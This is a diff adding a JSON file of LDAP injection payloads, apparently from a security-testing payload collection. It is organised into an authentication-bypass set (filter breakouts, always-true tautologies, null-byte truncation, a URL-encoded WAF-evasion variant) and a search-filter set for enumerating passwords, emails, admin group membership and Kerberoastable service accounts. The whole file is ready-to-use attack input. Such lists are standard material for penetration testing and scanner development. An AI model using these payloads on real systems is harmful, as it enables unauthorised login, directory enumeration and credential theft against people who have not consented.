@@ -1,0 +1,35 @@
+{
+  "category": "ldap_injection",
+  "contexts": {
+    "authentication_bypass": {
+      "description": "LDAP filter injection to bypass authentication checks",
+      "payloads": [
+        {"payload": "*", "description": "Wildcard match — returns all entries", "waf_bypass": false},
+        {"payload": "admin)(&)", "description": "Close filter and inject always-true AND", "waf_bypass": false},
+        {"payload": "admin)(|(password=*))", "description": "OR injection to match any password", "waf_bypass": false},
+        {"payload": "*)(uid=*))(|(uid=*", "description": "Nested filter breakout — match all UIDs", "waf_bypass": false},
+        {"payload": "*)(%26)", "description": "URL-encoded ampersand AND operator injection", "waf_bypass": true},
+        {"payload": "admin)(!(&(1=0)))", "description": "NOT-AND tautology bypass", "waf_bypass": false},
+        {"payload": "*))%00", "description": "Null byte to truncate filter suffix", "waf_bypass": false},
+        {"payload": "admin)(objectClass=*))(&(objectClass=person", "description": "Inject objectClass filter to widen match", "waf_bypass": false},
+        {"payload": "x])(|(cn=*", "description": "Bracket injection for filters using square brackets", "waf_bypass": false},
+        {"payload": "*)(cn=admin))", "description": "Inject specific CN match", "waf_bypass": false}
+      ]
+    },
+    "search_filter": {
+      "description": "LDAP search filter injection for data extraction and enumeration",
+      "payloads": [
+        {"payload": "*)(objectClass=*", "description": "Enumerate all object classes", "waf_bypass": false},
+        {"payload": "*)(userPassword=*", "description": "Test for userPassword attribute exposure", "waf_bypass": false},
+        {"payload": "*)(mail=*@*", "description": "Email attribute wildcard enumeration", "waf_bypass": false},
+        {"payload": "*)(telephoneNumber=*", "description": "Phone number attribute enumeration", "waf_bypass": false},
+        {"payload": "*)(memberOf=CN=Admin*", "description": "Enumerate admin group membership", "waf_bypass": false},
+        {"payload": "a])(|(cn=*", "description": "Square bracket breakout for DN-based filters", "waf_bypass": false},
+        {"payload": "*)(description=*", "description": "Description attribute wildcard for info leakage", "waf_bypass": false},
+        {"payload": "*)(!(objectClass=computer))", "description": "NOT filter to exclude computer objects", "waf_bypass": false},
+        {"payload": "*)(sAMAccountName=*admin*", "description": "SAM account name wildcard for AD environments", "waf_bypass": false},
+        {"payload": "*)(servicePrincipalName=*", "description": "SPN enumeration for Kerberoasting leads", "waf_bypass": false}
+      ]
+    }
+  }
+}
